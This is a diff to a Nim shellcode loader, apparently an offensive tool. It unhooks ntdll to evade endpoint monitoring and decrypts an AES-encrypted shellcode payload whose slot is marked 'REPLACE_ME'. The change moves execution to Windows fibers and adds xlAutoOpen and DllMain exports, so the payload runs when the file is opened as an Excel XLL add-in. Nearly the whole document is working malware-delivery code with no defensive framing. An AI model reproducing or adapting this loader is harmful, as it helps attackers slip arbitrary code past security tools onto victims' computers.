@@ -62,31 +62,46 @@ proc ntdllunhook(): bool =
   return true
 
 
+
+
 proc shellcodeCallback(shellcode: openarray[byte]): void =
 
-    let rPtr = VirtualAlloc(
-        NULL,
-        cast[SIZE_T](shellcode.len),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
+    let MasterFiber = ConvertThreadToFiber(NULL)
+    let vAlloc = VirtualAlloc(
+      NULL, 
+      cast[SIZE_T](shellcode.len), 
+      MEM_COMMIT, 
+      PAGE_EXECUTE_READ_WRITE
     )
 
     var bytesWritten: SIZE_T
-    RtlMoveMemory(
-        rPtr, 
-        unsafeAddr shellcode,
-        cast[SIZE_T](shellcode.len),
+    let pHandle = GetCurrentProcess()
+    WriteProcessMemory( 
+      pHandle, 
+      vAlloc, 
+      unsafeaddr shellcode, 
+      cast[SIZE_T](shellcode.len), 
+      addr bytesWritten
     )
 
-    CertEnumSystemStore(
-        CERT_SYSTEM_STORE_CURRENT_USER,
-        NULL,
-        NULL,
-        cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr),
+    let xFiber = CreateFiber(
+      0, 
+      cast[LPFIBER_START_ROUTINE](vAlloc), 
+      NULL
     )
 
-when isMainModule:
-        let shellcode_base64_encrypted = "REPLACE_ME" 
+    SwitchToFiber(xFiber)
+
+
+
+
+
+
+
+
+proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
+   when isMainModule:
+        let shellcode_base64_encrypted = "REPLACE_ME" #the easy way! replace me back if you need to remake your payload
         var result = ntdllunhook()  #so we need to assign it to a variable even though its not used. But if you discard it, it won't work... O_o
         var encodedIV: string = "t47unCor+GR9+cD+2d6FlQ==" #base64 encoded IV. hardcoded...fix this later
         var dctx: CTR[aes256]
@@ -112,3 +127,10 @@ when isMainModule:
         
         #fire!
         shellcodeCallback(dectext)
+
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+
+  return true
